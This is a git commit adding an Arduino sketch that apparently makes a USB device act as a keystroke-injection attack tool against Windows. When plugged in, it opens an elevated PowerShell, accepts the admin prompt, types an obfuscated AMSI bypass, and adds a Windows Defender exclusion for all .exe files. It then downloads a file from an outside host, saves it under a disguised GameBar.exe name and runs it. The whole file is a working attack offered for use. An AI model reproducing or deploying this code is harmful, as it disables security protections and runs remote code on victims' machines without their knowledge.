bc4290bf078747ea13af915c1b1679a3399d5b98
N3agu <78364462+N3agu@users.noreply.github.com>
2024-06-09 10:05:37 -0700

    Create DownloadExecute.ino

---
+++ Scripts/DownloadExecute.ino
@@ -0,0 +1,94 @@
+#include "Keyboard.h"
+
+void setup() {
+  Keyboard.begin();
+  
+  delay(500);
+
+  // Press Ctrl + R
+  Keyboard.press(KEY_LEFT_GUI);  
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  // Run powershell
+  Keyboard.print("powershell");
+
+  delay(200);
+
+  // Press Ctrl + Shift + Enter
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  // Press Left Arrow
+  Keyboard.press(KEY_LEFT_ARROW);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  // Press Enter
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  // AMSI Bypass
+  // 1st Command
+  Keyboard.print("$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(10);
+
+  // 2nd Command
+  Keyboard.print("$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(10);
+
+  // 3rd Command
+  Keyboard.print("$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+
+  delay(10);
+
+  // 4th Command
+  Keyboard.print("$field.SetValue($null,$true)");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  delay(50);
+  Keyboard.releaseAll();
+
+  // Add Windows Defender exclusions
+  Keyboard.print("Add-MpPreference -ExclusionExtension \"exe\"");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  // Download the payload (default: putty.exe), execute it and close the window
+  Keyboard.print("Invoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe\" -OutFile \"C:\\Users\\$Env:UserName\\AppData\\Local\\Microsoft\\WindowsApps\\GameBar.exe\"; & \"C:\\Users\\$Env:UserName\\AppData\\Local\\Microsoft\\WindowsApps\\GameBar.exe\";exit");
+  delay(50);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+}
+
+void loop() {
+  
+}
